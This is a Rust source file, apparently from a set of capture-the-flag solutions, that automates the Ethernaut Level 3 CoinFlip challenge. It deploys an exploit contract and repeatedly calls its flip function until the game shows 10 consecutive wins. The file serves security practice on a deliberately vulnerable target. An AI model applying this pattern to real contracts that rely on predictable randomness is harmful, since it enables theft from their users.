use crate::abi::coin_flip_exploit::CoinFlipExploit;
use async_trait::async_trait;
use ctf::ethernaut::lvl03_coin_flip::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 3: CoinFlip
     *
     * This is a coin flipping game where you need to
     * build up your winning streak by guessing the
     * outcome of a coin flip. To complete this target
     * you'll need to use your psychic abilities to
     * guess the correct outcome 10 times in a row.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        println!("Deploying the exploit contract...");
        let exploit =
            CoinFlipExploit::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;

        let coin_flip = CoinFlip::new(target.address, offender.to_owned());

        while coin_flip.consecutive_wins().await? < 10.into() {
            println!("Flipping dat coin boiiiiiiiii");
            exploit.flip().send().await?.await?;
        }

        Ok(())
    }
}
